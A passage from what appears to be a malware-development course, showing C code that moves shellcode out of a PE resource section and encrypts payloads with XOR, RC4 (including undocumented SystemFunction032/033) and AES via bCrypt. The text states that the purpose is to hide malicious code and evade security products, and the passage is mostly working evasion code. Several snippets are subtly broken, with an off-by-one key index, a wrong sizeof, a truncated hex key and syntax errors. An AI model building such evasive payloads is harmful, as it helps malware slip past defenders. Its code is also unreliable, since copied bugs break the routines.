After compiling and running the code above, the payload address along with its size will be printed onto the screen. It is important to note that this address is in the??`.rsrc`??section, which is read-only memory, and any attempts to change or edit data within it will cause an access violation error. To edit the payload, a buffer must be allocated with the same size as the payload and copied over. This new buffer is where changes, such as decrypting the payload, can be made.

### Updating .rsrc Payload

Since the payload can't be edited directly from within the resource section, it must be moved to a temporary buffer. To do so, memory is allocated the size of the payload using??[HeapAlloc](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc)??and then the payload is moved from the resource section to the temporary buffer using??`memcpy`.

```c
// Allocating memory using a HeapAlloc call
PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
if (pTmpBuffer != NULL){
	// copying the payload from resource section to the new buffer 
	memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
}

// Printing the base address of our buffer (pTmpBuffer)
printf("[i] pTmpBuffer var : 0x%p \n", pTmpBuffer);

```

Since??`pTmpBuffer`??now points to a writable memory region that is holding the payload, it's possible to decrypt the payload or perform any updates to it.

The image below shows the Msfvenom shellcode stored in the resource section.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/rsrc-payload.png)

Proceeding with the execution, the payload is saved in the temporary buffer.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/rsrc-tmpbuffer.png)
# 2.4 Introduction to Payload Encryption
### Payload Encryption

Payload encryption in malware is a technique used by attackers to hide the malicious code contained in a malicious file. Attackers use various encryption algorithms to conceal the malicious code, making it more difficult for security solutions to detect the malicious activity of the file. Encryption also helps the malware to remain hidden and undetected on the user's system for longer periods. Encrypting parts of the malware will almost always be necessary against modern security solutions.

### Encryption Pros and Cons

Encryption can help evade signature-based detection when using signatured code and payloads, but it may not be effective against other forms of detection, such as runtime and heuristic analysis.

It is important to note that the more data that's encrypted within a file, the higher its??[entropy](https://practicalsecurityanalytics.com/file-entropy/). Having a file with a high entropy score can cause security solutions to flag the file or at the very least consider it suspicious and place additional scrutiny on it. Decreasing a file's entropy will be discussed in future modules.

### Encryption Types

The upcoming modules will go through three of the most widely used encryption algorithms in malware development:

- XOR
    
- AES
    
- RC4
# 2.5 Payload Encryption - XOR

### Introduction

XOR encryption is the simplest to use and the lightest to implement, making it a popular choice for malware. It is faster than AES and RC4 and does not require any additional libraries or the usage of Windows APIs. Additionally, it is a bidirectional encryption algorithm that allows the same function to be used for both encryption and decryption.

### XOR Encryption

The code snippet below shows a basic XOR encryption function. The function simply XORs each byte of the shellcode with a 1-byte key.

```c
/*
	- pShellcode : Base address of the payload to encrypt 
	- sShellcodeSize : The size of the payload 
	- bKey : A single arbitrary byte representing the key for encrypting the payload
*/
VOID XorByOneKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
	for (size_t i = 0; i < sShellcodeSize; i++){
		pShellcode[i] = pShellcode[i] ^ bKey;
	}
}
```

### Securing The Encryption Key

Some tools and security solutions can brute force the key which will expose the decrypted shellcode. To make the process of guessing the key more difficult for these tools, the code below performs a minor change and increases the keyspace of the key by making??`i`??a part of the key. With keyspace much larger now, it's more difficult to brute force the key.

```c
/*
	- pShellcode : Base address of the payload to encrypt 
	- sShellcodeSize : The size of the payload 
	- bKey : A single arbitrary byte representing the key for encrypting the payload
*/
VOID XorByiKeys(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = pShellcode[i] ^ (bKey + i);
	}
}
```

The code snippet above can still be hardened further. The snippet below performs the encryption process with a key, using every byte of the key repeatedly making it harder to crack the key.

```c
/*
	- pShellcode : Base address of the payload to encrypt 
	- sShellcodeSize : The size of the payload 
	- bKey : A random array of bytes of specific size
	- sKeySize : The size of the key
*/
VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j > sKeySize){
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}
```

### Conclusion

It is recommended to utilize XOR encryption for small tasks, such as obscuring strings. However, for larger payloads, it is advised to use more secure encryption methods such as AES.
# 2.6 Payload Encryption - RC4

### Introduction

RC4 is a fast and efficient stream cipher that is also a bidirectional encryption algorithm that allows the same function to be used for both encryption and decryption. There are several C implementations of RC4 publicly available but this module will demonstrate three ways of performing RC4 encryption.

Note that diving into how the RC4 algorithm works is not the goal of this module and it's not required to fully understand it in depth. Rather the goal is encrypting the payload to evade detection.

### RC4 Encryption - Method 1

This method uses the RC4 implementation found??[here](https://www.oryx-embedded.com/doc/rc4_8c_source.html)??due to its stability and well-written code. There are two functions??`rc4Init`??and??`rc4Cipher`??which are used to initialize a??`rc4context`??structure and perform the RC4 encryption, respectively.

```c
typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;


void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	// Check parameters
	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		//Randomize the permutations using the supplied key
		j = (j + context->s[i] + key[i % length]) % 256;

		//Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length){
	unsigned char temp;

	// Restore context
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	// Encryption loop
	while (length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// Valid input and output?
		if (input != NULL && output != NULL)
		{
			//XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			//Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}

```

#### RC4 Encryption

The code below shows how the??`rc4Init`??and??`rc4Cipher`??functions are used to encrypt a payload.

```c
	// Initialization
	Rc4Context ctx = { 0 };

	// Key used for encryption
	unsigned char* key = "maldev123";
	rc4Init(&ctx, key, sizeof(key));

	// Encryption //
	// plaintext - The payload to be encrypted
	// ciphertext - A buffer that is used to store the outputted encrypted data
	rc4Cipher(&ctx, plaintext, ciphertext, sizeof(plaintext));
```

#### RC4 Decryption

The code below shows how the??`rc4Init`??and??`rc4Cipher`??functions are used to decrypt a payload.

```c
	// Initialization
	Rc4Context ctx = { 0 };

	// Key used to decrypt
	unsigned char* key = "maldev123";
	rc4Init(&ctx, key, sizeof(key));

	// Decryption //
	// ciphertext - Encrypted payload to be decrypted
	// plaintext - A buffer that is used to store the outputted plaintext data
	rc4Cipher(&ctx, ciphertext, plaintext, sizeof(ciphertext));
```

### RC4 Encryption - Method 2

The undocumented Windows NTAPI??`SystemFunction032`??offers a faster and smaller implementation of the RC4 algorithm. Additional information about this API can be found on??[this Wine API page](https://source.winehq.org/WineAPI/SystemFunction032.html).

#### SystemFunction032

The documentation page states that the function??`SystemFunction032`??accepts two parameters of type??`USTRING`.

```c
 NTSTATUS SystemFunction032
 (
  struct ustring*       data,
  const struct ustring* key
 )
```

#### USTRING Structure

Unfortunately, since this is an undocumented API the structure of??`USTRING`??is unknown. But through additional research, it's possible to locate the??`USTRING`??structure definition in??[wine/crypt.h](https://github.com/wine-mirror/wine/blob/master/dlls/advapi32/crypt.h#L94). The structure is shown below.

```c
typedef struct
{
	DWORD	Length;         // Size of the data to encrypt/decrypt
	DWORD	MaximumLength;  // Max size of the data to encrypt/decrypt, although often its the same as Length (USTRING.Length = USTRING.MaximumLength = X)
	PVOID	Buffer;         // The base address of the data to encrypt/decrypt

} USTRING;
```

Now that the??`USTRING`??struct is known, the??`SystemFunction032`??function can be used.

#### Retrieving SystemFunction032's Address

To use??`SystemFunction032`, its address must first be retrieved. Since??`SystemFunction032`??is exported from??`advapi32.dll`, the DLL must be loaded into the process using??`LoadLibrary`. The return value of the function call can be used directly in??`GetProcAddress`.

Once the address of??`SystemFunction032`??has been successfully retrieved, it should be type-casted to a function pointer matching the definition found on the previously referenced??[Wine API page](https://source.winehq.org/WineAPI/SystemFunction032.html). However, the returned address can be casted directly from??`GetProcAddress`. This is all demonstrated in the snippet below.

```c
fnSystemFunction032 SystemFunction032 = (fnSystemFunction032) GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");
```

The function pointer of??`SystemFunction032`??is defined as the??`fnSystemFunction032`??data type which is shown below.

```c
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,   // Structure of type USTRING that holds information about the buffer to encrypt / decrypt 
	struct USTRING* Key     // Structure of type USTRING that holds information about the key used while encryption / decryption
);
```

#### SystemFunction032 Usage

The snippet below provides a working code sample that utilizes the??`SystemFunction032`??function to perform RC4 encryption and decryption.

```c
typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,
	struct USTRING* Key
);

/*
Helper function that calls SystemFunction032
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS STATUS	= NULL;
	
	USTRING Data = { 
		.Buffer         = pPayloadData,
		.Length         = sPayloadSize,
		.MaximumLength  = sPayloadSize
	};

	USTRING	Key = {
		.Buffer         = pRc4Key,
		.Length         = dwRc4KeySize,
		.MaximumLength  = dwRc4KeySize
	};

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
```

### RC4 Encryption - Method 3

Another way to implement the RC4 algorithm is using the??`SystemFunction033`??which takes the same parameters as the previously shown??`SystemFunction032`??function.

```c

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction033)(
	struct USTRING* Data,
	struct USTRING* Key
	);


/*
Helper function that calls SystemFunction033
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS	STATUS = NULL;

	USTRING		Key = { 
			.Buffer        = pRc4Key, 
			.Length        = dwRc4KeySize,
			.MaximumLength = dwRc4KeySize 
	};
		
	USTRING 	Data = {
			.Buffer         = pPayloadData, 	
			.Length         = sPayloadSize,		
			.MaximumLength  = sPayloadSize 
	};

	fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction033");

	if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction033 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

```

#### Encryption/Decryption Key Format

The code snippets in this module and other encryption modules use one valid way of representing the encryption/decryption key. However, it's important to be aware that the key can be represented using several different ways.

Be aware that hardcoding the plaintext key into the binary is considered bad practice and can be easily pulled when the malware is analyzed. Future modules will provide solutions to ensure the key cannot be easily retrieved.

```c
// Method 1
unsigned char* key = "maldev123";

// Method 2
// This is 'maldev123' represented as an array of hexadecimal bytes
unsigned char key[] = {
	0x6D, 0x61, 0x6C, 0x64, 0x65, 0x76, 0x31, 0x32, 0x33
};

// Method 3
// This is 'maldev123' represented in a hex/string form (hexadecimal escape sequence)
unsigned char* key = "\x6D\x61\x64\x65\x76\x31\x32\x33";

// Method 4 - better approach (via stack strings)
// This is 'maldev123' represented in an array of chars
unsigned char key[] = {
	'm', 'a', 'l', 'd', 'e', 'v', '1', '2', '3'
};
```
# 2.7 Payload Encryption - AES Encryption

### Advanced Encryption Standard

This module discusses a more secure encryption algorithm, Advanced Encryption Standard (AES). It is a symmetric-key algorithm, meaning the same key is used for both encryption and decryption. There are several types of AES encryption such as AES128, AES192, and AES256 that vary by the key size. For example, AES128 uses a 128-bit key whereas AES256 uses a 256-bit key.

Additionally, AES can use different??[block cipher modes of operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation)??such as CBC and GCM. Depending on the AES mode, the AES algorithm will require an additional component along with the encryption key called an??[Initialization Vector](https://en.wikipedia.org/wiki/Initialization_vector)??or IV. Providing an IV provides an additional layer of security to the encryption process.

Regardless of the chosen AES type, AES always requires a 128-bit input and produces a 128-bit output blocks. The important thing to keep in mind is that the input data should be multiples of 16 bytes (128 bits). If the payload being encrypted is not a multiple of 16 bytes then padding is required to increase the size of the payload and make it a multiple of 16 bytes.

The module provides 2 code samples that use AES256-CBC. The first sample is achieved through the bCrypt library which utilizes WinAPIs and the second sample uses??[Tiny Aes Project](https://github.com/kokke/tiny-AES-c). Note that since the AES256-CBC is being used, the code uses a 32-byte key and a 16-byte IV. Again, this would vary if the code used a different AES type or mode.

### AES Using WinAPIs (bCrypt Library)

There are several ways to implement the AES encryption algorithm. This section utilizes the bCrypt library ([bcrypt.h](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/)) to perform AES encryption. This section will explain the code which is available for download as usual at the top right of the module box.

#### AES Structure

To start, an??`AES`??structure is created which contains the required data to perform encryption and decryption.

```c
typedef struct _AES {

	PBYTE	pPlainText;         // base address of the plain text data 
	DWORD	dwPlainSize;        // size of the plain text data

	PBYTE	pCipherText;        // base address of the encrypted data	
	DWORD	dwCipherSize;       // size of it (this can change from dwPlainSize in case there was padding)

	PBYTE	pKey;               // the 32 byte key
	PBYTE	pIv;                // the 16 byte iv

} AES, *PAES;
```

#### SimpleEncryption Wrapper

The??`SimpleEncryption`??function has six parameters that are used to initialize the??`AES`??structure. Once the structure is initialized, the function will call??`InstallAesEncryption`??to perform the AES encryption process. Note that two of its parameters are??`OUT`??parameters, therefore the function returns the following:

- `pCipherTextData`??- A pointer to the newly allocated heap buffer which contains the ciphertext data.
    
- `sCipherTextSize`??- The size of the ciphertext buffer.
    

The function returns??`TRUE`??if the??`InstallAesEncryption`??succeeds, otherwise??`FALSE`.

```c
// Wrapper function for InstallAesEncryption that makes things easier
BOOL SimpleEncryption(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {

	if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;
	
	// Intializing the struct
	AES Aes = {
		.pKey        = pKey,
		.pIv         = pIv,
		.pPlainText  = pPlainTextData,
		.dwPlainSize = sPlainTextSize
	};

	if (!InstallAesEncryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pCipherTextData = Aes.pCipherText;
	*sCipherTextSize = Aes.dwCipherSize;

	return TRUE;
}
```

#### SimpleDecryption Wrapper

The??`SimpleDecryption`??function also has six parameters and behaves similarly to??`SimpleEncryption`??with the difference being that it calls the??`InstallAesDecryption`??function and it returns two different values.

- `pPlainTextData`??- A pointer to the newly allocated heap buffer which contains the plaintext data.
    
- `sPlainTextSize`??- The size of the plaintext buffer.
    

The function returns??`TRUE`??if the??`InstallAesDecryption`??succeeds, otherwise??`FALSE`.

```c
// Wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	// Intializing the struct
	AES Aes = {
		.pKey          = pKey,
		.pIv           = pIv,
		.pCipherText   = pCipherTextData,
		.dwCipherSize  = sCipherTextSize
	};

	if (!InstallAesDecryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}
```

#### Cryptographic Next Generation

Cryptographic Next Generation (CNG) provides a set of cryptographic functions that can be used by applications of the OS. CNG provides a standardized interface for cryptographic operations, making it easier for developers to implement security features in their applications. Both??`InstallAesEncryption`??and??`InstallAesDecryption`??functions make use of CNG.

More information about CNG is available??[here](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-portal).

#### InstallAesEncryption Function

The??`InstallAesEncryption`??is the function that performs AES encryption. The function has one parameter,??`PAES`, which is a pointer to a populated??`AES`??structure. The bCrypt library functions used in the function are shown below.

- [BCryptOpenAlgorithmProvider](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptopenalgorithmprovider)??- Used to load the??[BCRYPT_AES_ALGORITHM](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-algorithm-identifiers)??Cryptographic Next Generation (CNG) provider to enable the use of cryptographic functions.
    
- [BCryptGetProperty](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptgetproperty)??- This function is called twice, the first time to retrieve the value of??[BCRYPT_OBJECT_LENGTH](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-property-identifiers)??and the second time to fetch the value of??[BCRYPT_BLOCK_LENGTH](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-property-identifiers)??property identifiers.
    
- [BCryptSetProperty](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptsetproperty)??- Used to initialize the??`BCRYPT_OBJECT_LENGTH`??property identifier.
    
- [BCryptGenerateSymmetricKey](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptgeneratesymmetrickey)??- Used to create a key object from the input AES key specified.
    
- [BCryptEncrypt](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptencrypt)??- Used to encrypt a specified block of data. This function is called twice, the first time retrieves the size of the encrypted data to allocate a heap buffer of that size. The second call encrypts the data and stores the ciphertext in the allocated heap.
    
- [BCryptDestroyKey](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptdestroykey)??- Used to clean up by destroying the key object created using??`BCryptGenerateSymmetricKey`.
    
- [BCryptCloseAlgorithmProvider](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptclosealgorithmprovider)??- Used to clean up by closing the object handle of the algorithm provider created earlier using??`BCryptOpenAlgorithmProvider`.
    

The function returns??`TRUE`??if it successfully encrypts the payload, otherwise??`FALSE`.

```c
// The encryption implementation
BOOL InstallAesEncryption(PAES pAes) {

  BOOL                  bSTATE           = TRUE;
  BCRYPT_ALG_HANDLE     hAlgorithm       = NULL;
  BCRYPT_KEY_HANDLE     hKeyHandle       = NULL;

  ULONG       		cbResult         = NULL;
  DWORD       		dwBlockSize      = NULL;
  
  DWORD       		cbKeyObject      = NULL;
  PBYTE       		pbKeyObject      = NULL;

  PBYTE      		pbCipherText     = NULL;
  DWORD       		cbCipherText     = NULL,


  // Intializing "hAlgorithm" as AES algorithm Handle
  STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later 
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
   	printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating memory for the key object 
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject and will be of size cbKeyObject 
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbCipherText
  pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
  if (pbCipherText == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt again with pbCipherText as the output buffer
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }


  // Clean up
_EndOfFunc:
  if (hKeyHandle) 
    	BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm) 
    	BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject) 
    	HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbCipherText != NULL && bSTATE) {
        // If everything worked, save pbCipherText and cbCipherText 
        pAes->pCipherText 	= pbCipherText;
        pAes->dwCipherSize 	= cbCipherText;
  }
  return bSTATE;
}
```

#### InstallAesDecryption Function

The??`InstallAesDecryption`??is the function that performs AES decryption. The function has one parameter,??`PAES`, which is a pointer to a populated??`AES`??structure. The bCrypt library functions used in the function are the same as in the??`InstallAesEncryption`??function above, with the only difference being that??`BCryptDecrypt`??is used instead of??`BCryptEncrypt`.

- [BCryptDecrypt](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptdecrypt)??- Used to decrypt a specified block of data. This function is called twice, the first time retrieves the size of the decrypted data to allocate a heap buffer of that size. The second call decrypts the data and stores the plaintext data in the allocated heap.

The function returns??`TRUE`??if it successfully decrypts the payload, otherwise??`FALSE`.

```c
// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

  BOOL                  bSTATE          = TRUE;
  BCRYPT_ALG_HANDLE     hAlgorithm      = NULL;
  BCRYPT_KEY_HANDLE     hKeyHandle      = NULL;

  ULONG                 cbResult        = NULL;
  DWORD                 dwBlockSize     = NULL;
  
  DWORD                 cbKeyObject     = NULL;
  PBYTE                 pbKeyObject     = NULL;

  PBYTE                 pbPlainText     = NULL;
  DWORD                 cbPlainText     = NULL,

  // Intializing "hAlgorithm" as AES algorithm Handle
  STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Allocating memory for the key object 
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject of size cbKeyObject 
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Allocating enough memory for the output buffer, cbPlainText
  pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
  if (pbPlainText == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Running BCryptDecrypt again with pbPlainText as the output buffer
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Clean up
_EndOfFunc:
  if (hKeyHandle)
    	BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
    	BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
    	HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbPlainText != NULL && bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes->pPlainText   = pbPlainText;
        pAes->dwPlainSize  = cbPlainText;
  }
  return bSTATE;

}
```

#### Additional Helper Functions

The code also includes two small helper functions as well,??`PrintHexData`??and??`GenerateRandomBytes`.

The first function,??`PrintHexData`, prints an input buffer as a char array in C syntax to the console.

```c
// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

  printf("unsigned char %s[] = {", Name);

  for (int i = 0; i < Size; i++) {
    	if (i % 16 == 0)
      	    printf("\n\t");
	    
      if (i < Size - 1) {
          printf("0x%0.2X, ", Data[i]);
      } else {
